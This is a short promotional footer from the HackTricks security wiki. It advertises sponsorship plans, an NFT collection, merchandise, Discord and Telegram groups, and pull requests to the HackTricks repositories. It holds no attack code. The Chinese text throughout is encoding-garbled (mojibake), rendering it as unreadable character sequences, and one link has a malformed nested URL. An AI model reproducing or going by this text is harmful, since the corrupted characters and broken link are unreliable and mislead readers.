* ä½ åœ¨ä¸€å®¶ **ç½‘ç»œå®‰å…¨å…¬å¸** å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„ **å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾— **PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF** å—ï¼Ÿè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨ **Twitter** ä¸Š **å…³æ³¨** æˆ‘ [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘** [**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ** [**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
